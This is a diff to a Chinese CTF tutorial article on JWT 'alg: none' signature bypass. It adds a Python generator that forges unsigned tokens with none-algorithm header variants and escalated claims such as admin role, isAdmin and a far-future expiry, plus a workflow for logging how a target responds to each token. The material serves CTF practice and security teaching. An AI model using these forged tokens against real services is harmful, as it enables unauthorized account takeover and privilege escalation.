@@ -11,11 +11,11 @@ category: "02-auth"
 signals: ["alg:none", "none算法", "无签名", "签名绕过", "JWT", "jwt_tool"]
 mcp_tools: ["run_ctf_tool", "http_probe"]
 keywords: ["JWT alg:none", "无签名绕过", "none攻击", "JWT签名绕过", "jwt_tool", "alg none"]
-difficulty: "beginner"
+difficulty: "advanced"
 tags: ["authentication", "jwt", "signature-bypass", "web-security", "ctf"]
 language: "zh-CN"
 last_updated: "2026-07-04"
-related_articles: []
+related_articles: ["ctf-website/02-auth/jwt/00-overview", "ctf-website/02-auth/jwt/06-claim-missing", "ctf-website/13-signature/01-algorithm"]
 ---
 
 # JWT `alg: none` 无签名绕过
@@ -38,6 +38,38 @@ related_articles: []
 | 双点 token | `header.payload.` | 空字符串 | 业务身份变化 | signature required |
 
 核心 oracle：同一接口、同一会话下，只有 token 变体不同；如果身份、权限、订单、flag 或响应字段稳定变化，才进入下一步。
+
+### 0.1 none 变体生成器
+
+```python
+# jwt_none_variants.py — none/空签名变体
+import base64
+import json
+
+def b64u(obj):
+    raw = json.dumps(obj, separators=(",", ":"), ensure_ascii=False).encode()
+    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
+
+def none_variants(payload):
+    headers = [
+        {"alg": "none", "typ": "JWT"},
+        {"alg": "None", "typ": "JWT"},
+        {"alg": "NONE", "typ": "JWT"},
+        {"alg": "", "typ": "JWT"},
+        {"typ": "JWT"},
+    ]
+    bodies = [
+        payload,
+        {**payload, "role": "admin"},
+        {**payload, "isAdmin": True},
+        {**payload, "exp": 4102444800},
+    ]
+    for h in headers:
+        for p in bodies:
+            yield f"{b64u(h)}.{b64u(p)}."
+```
+
+记录 `none_oracle.jsonl`：`variant_id`、header、payload diff、signature 形态、状态码、响应 hash、业务字段。若 none 失败但 claim 变体导致业务字段变化，转 `06-claim-missing.md`；若错误提示暴露 allowed algorithms，转 `02-algorithm-confusion.md`。
 
 ## 原理
 
